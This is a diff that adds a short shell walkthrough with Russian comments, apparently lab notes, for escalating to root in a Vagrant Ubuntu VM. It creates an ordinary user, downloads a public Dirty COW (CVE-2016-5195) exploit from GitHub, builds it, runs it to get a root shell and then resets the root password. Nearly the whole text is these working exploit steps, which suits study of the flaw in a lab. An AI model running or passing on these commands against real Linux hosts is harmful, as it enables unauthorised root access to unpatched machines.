@@ -1,0 +1,19 @@
+vagrant ssh ubuntu_host
+sudo su -
+#Зададим пароль root
+passwd
+Добавим юзера
+adduser alex1
+su - alex1
+Под обычным пользователем качаем exploit
+wget https://github.com/gbonacini/CVE-2016-5195/archive/master.zip
+unzip master.zip
+cd CVE-2016-5195-master
+make
+
+#далее выполняем
+./dcow -s -n
+#вуаля имеем доступ root, сменим пароль root
+passwd
+
+
